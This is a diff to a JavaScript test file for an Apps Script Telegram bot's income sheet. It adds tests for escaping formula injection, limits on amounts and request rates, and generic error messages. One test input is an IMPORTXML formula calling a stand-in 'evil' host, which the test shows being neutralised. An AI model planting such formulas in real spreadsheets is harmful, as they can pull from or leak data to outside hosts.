@@ -175,6 +175,7 @@ test('earned: only my income rows; managers get the form with their races', () =
 
 // Запуск собранного dist/Code.gs в песочнице с заглушками сервисов Google.
 function loadGas(botToken, sheets) {
+  const cache = {};
   const code = readFileSync(new URL('../dist/Code.gs', import.meta.url), 'utf8');
   const signed = (buf) => [...buf].map((b) => (b > 127 ? b - 256 : b));
   const unsigned = (arr) => Buffer.from(arr.map((b) => (b + 256) % 256));
@@ -197,6 +198,8 @@ function loadGas(botToken, sheets) {
       }),
     },
     LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
+    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] ?? null, put: (k, v) => (cache[k] = v) }) },
+    console: { error() {} },
   };
   let uuid = 0;
   ctx.Utilities.getUuid = () => 'id' + ++uuid;
@@ -268,4 +271,24 @@ test('Apps Script: manager adds and deletes income; others cannot', () => {
   assert.equal(doGet({ initData: as('melvn_boss'), action: 'deleteIncome', id }).error, 'not_found');
   v = doGet({ initData: as('oleg_manager'), action: 'deleteIncome', id });
   assert.deepEqual(v.finance.earned, []);
+});
+
+test('Apps Script: income note cannot inject a formula; amount and rate are limited', () => {
+  const sheets = JSON.parse(JSON.stringify(gasSheets));
+  const doGet = loadGas('123:ABC', sheets);
+  const initData = signInitData('123:ABC', { id: 7, username: 'oleg_manager' }).toString();
+  doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '100', note: '=IMPORTXML("http://evil","//a")' });
+  const row = sheets['Заработок'].at(-1);
+  assert.equal(row[5], `'=IMPORTXML("http://evil","//a")`);
+  assert.equal(doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '99999999' }).error, 'bad_amount');
+  assert.equal(doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '-5' }).error, 'bad_amount');
+  let last;
+  for (let i = 0; i < 40; i++) last = doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '1' });
+  assert.equal(last.error, 'too_many');
+});
+
+test('Apps Script: errors do not leak details', () => {
+  const doGet = loadGas('123:ABC', { 'Люди': [['Telegram'], ['x'], ['ivan_petrov']], get 'События'() { throw new Error('secret path'); } });
+  const v = doGet({ initData: signInitData('123:ABC', { id: 1, username: 'ivan_petrov' }).toString() });
+  assert.deepEqual(v, { error: 'sheet_unavailable' });
 });
